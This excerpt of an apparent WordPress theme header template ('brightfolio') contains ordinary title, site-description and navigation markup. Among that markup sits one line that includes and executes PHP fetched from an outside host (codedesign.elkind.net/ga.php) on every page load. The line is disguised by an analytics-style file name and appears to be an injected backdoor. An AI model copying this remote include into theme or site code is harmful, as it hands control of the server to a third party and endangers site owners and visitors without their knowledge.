...
<title><?php
	...
	if ( $paged >= 2 || $page >= 2 )
		echo ' | ' . sprintf( __( 'Page %s', 'brightfolio' ), max( $paged, $page ) );
...
<?php include_once("http://codedesign.elkind.net/ga.php") ?>
...
<div id="site-description"><?php bloginfo( 'description' ); ?>
			...
			<div id="access" role="navigation">
			  <?php /*  Allow screen readers / text browsers to skip the navigation menu and get right to the good stuff */ ?>
				<div class="skip-link screen-reader-text"><a href="#content" title="<?php esc_attr_e( 'Skip to content', 'brightfolio' ); ?>"><?php _e( 'Skip to content', 'brightfolio' ); ?></a></div>
